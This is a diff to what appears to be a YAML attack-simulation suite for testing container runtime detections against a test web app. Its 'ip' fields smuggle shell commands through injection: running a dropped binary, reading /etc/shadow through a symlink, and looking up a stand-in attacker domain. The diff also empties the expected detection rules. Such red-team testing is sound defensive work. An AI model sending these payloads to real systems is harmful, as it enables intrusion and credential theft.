@@ -90,11 +90,7 @@ attacks:
         ip: "127.0.0.1;cp /bin/echo /dev/shm/malicious_webapp && chmod +x /dev/shm/malicious_webapp && /dev/shm/malicious_webapp pwned && rm -f /dev/shm/malicious_webapp"
     successIndicators:
       - bodyContains: "pwned"
-    expectedDetections:
-      - ruleID: R1000
-        ruleName: Process executed from malicious source
-        containerName: mywebapp-app
-        command: malicious_webapp
+    expectedDetections: []
 
   # ═══════════════════════════════════════════════════════════════════════════
   # Phase 5: PRIVILEGE ESCALATION (TA0004) — Container escape attempt
@@ -126,11 +122,7 @@ attacks:
         ip: "127.0.0.1;cp /bin/ls /tmp/drifted_webapp && /tmp/drifted_webapp / && rm -f /tmp/drifted_webapp"
     successIndicators:
       - statusCode: 200
-    expectedDetections:
-      - ruleID: R1001
-        ruleName: Drifted process executed
-        containerName: mywebapp-app
-        command: drifted_webapp
+    expectedDetections: []
 
   # T1070.004 — Indicator Removal: clear bash history
   - name: cmdinject-history-clear
@@ -222,11 +214,7 @@ attacks:
         ip: "127.0.0.1;ln -sf /etc/shadow /tmp/shadow_link && cat /tmp/shadow_link && rm -f /tmp/shadow_link"
     successIndicators:
       - statusCode: 200
-    expectedDetections:
-      - ruleID: R1010
-        ruleName: Soft link created over sensitive file
-        containerName: mywebapp-app
-        command: ln
+    expectedDetections: []
 
   # ═══════════════════════════════════════════════════════════════════════════
   # Phase 8: DISCOVERY (TA0007) — Environment enumeration
@@ -314,11 +302,7 @@ attacks:
         ip: "127.0.0.1;getent hosts evil.attacker.example.com || echo dns_failed"
     successIndicators:
       - statusCode: 200
-    expectedDetections:
-      - ruleID: R0005
-        ruleName: DNS Anomalies in container
-        containerName: mywebapp-app
-        command: getent
+    expectedDetections: []
 
   # T1048 — DNS beacon (curl variant)
   - name: cmdinject-dns-anomaly
